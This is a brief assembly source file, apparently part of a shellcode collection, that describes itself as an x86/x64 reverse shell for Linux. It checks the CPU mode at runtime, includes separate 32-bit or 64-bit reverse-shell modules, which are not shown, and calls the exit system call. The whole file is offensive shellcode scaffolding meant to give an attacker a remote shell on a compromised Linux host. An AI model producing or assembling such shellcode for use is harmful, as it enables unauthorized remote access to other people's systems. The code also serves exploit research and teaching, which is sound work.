

; x86/x64 reverse shell for linux
; odzhan

    bits 32
    
    xor    eax, eax
    inc    eax
    jz     x64
    
%include "rs32.asm"
    
    push   1                 ; sys_exit
    pop    eax
    int    0x80
x64:

%include "rs64.asm"